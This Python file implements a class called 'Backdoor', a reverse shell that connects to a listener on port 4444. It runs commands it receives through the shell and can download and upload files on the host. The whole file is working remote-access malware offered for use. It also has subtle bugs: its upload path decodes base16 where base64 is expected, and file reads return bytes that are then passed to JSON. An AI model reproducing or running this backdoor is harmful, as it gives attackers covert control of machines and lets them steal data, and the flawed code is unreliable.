import codecs
import socket, subprocess, json, os, base64


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        # print("data : ", data)
        json_data = json.dumps(data)
        # print("Data is going to send.", json_data,  type(json_data))
        self.connection.send(bytes(json_data, 'utf-8'))

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_command(self, command):
        result = subprocess.check_output(command, shell=True)
        # print("Subprocess is : ", result.decode('utf-8'))
        return result.decode('utf-8')

    def change_dir(self, path):
        os.chdir(path)
        return "[+] Directory is Changed to " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b16decode(content))
            return "[+] Upload successfully."

    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_dir(command[1])
                elif command[0] == "download":
                    print("Command [1]:", command[1])
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_command(command)
            except Exception:
                print("[-] Error during command execution.")

            self.reliable_send(command_result)


try:
    my_backdoor = Backdoor("localhost", 4444)
    my_backdoor.run()
except Exception:
    exit()
